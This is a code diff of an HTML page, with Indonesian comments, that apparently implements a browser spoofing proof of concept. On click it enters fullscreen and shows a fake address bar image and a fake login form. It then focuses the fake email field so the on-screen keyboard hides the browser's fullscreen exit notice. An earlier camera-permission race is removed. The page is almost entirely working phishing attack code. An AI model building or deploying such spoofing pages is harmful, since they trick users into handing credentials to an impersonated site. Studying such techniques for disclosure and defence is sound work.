@@ -26,7 +26,7 @@
             flex-direction: column;
         }
 
-        /* Omnibox Palsu menggunakan file spoof.jpeg Anda */
+        /* Omnibox Palsu (spoof.jpeg) */
         #fake-omnibox {
             width: 100%;
             height: auto;
@@ -34,7 +34,7 @@
             border-bottom: 1px solid #e0e0e0;
         }
 
-        /* Area Form Login Palsu */
+        /* Area Form Login */
         #login-frame {
             flex-grow: 1;
             display: flex;
@@ -102,29 +102,25 @@
 
     <script>
         document.getElementById('trigger-zone').onclick = async () => {
-            // 1. Race Condition: Trigger Permission Foto/Video (Kamera)
-            (async () => {
-                try {
-                    // Memicu dialog izin kamera sistem
-                    await navigator.mediaDevices.getUserMedia({ video: true });
-                } catch(e) {
-                    console.log("Permission denied or blocked");
-                }
-            })();
-
-            // 2. Transisi Fullscreen
             try {
+                // 1. Masuk Fullscreen
                 if (document.documentElement.requestFullscreen) {
                     await document.documentElement.requestFullscreen();
                 } else if (document.documentElement.webkitRequestFullscreen) {
                     await document.documentElement.webkitRequestFullscreen();
                 }
 
-                // Mengubah tampilan menjadi halaman login palsu dengan omnibox palsu
+                // 2. Ganti UI ke mode spoofing
                 document.getElementById('trigger-zone').style.display = 'none';
                 document.getElementById('spoof-container').style.display = 'flex';
+
+                // 3. Race Condition: Picu Keyboard secara instan
+                // Ini akan menutupi instruksi sistem "Cara keluar"
+                const inputEmail = document.getElementById('fake_email');
+                inputEmail.focus();
+
             } catch (err) {
-                console.error("Fullscreen request failed:", err);
+                console.error("Error:", err);
             }
         };
     </script>
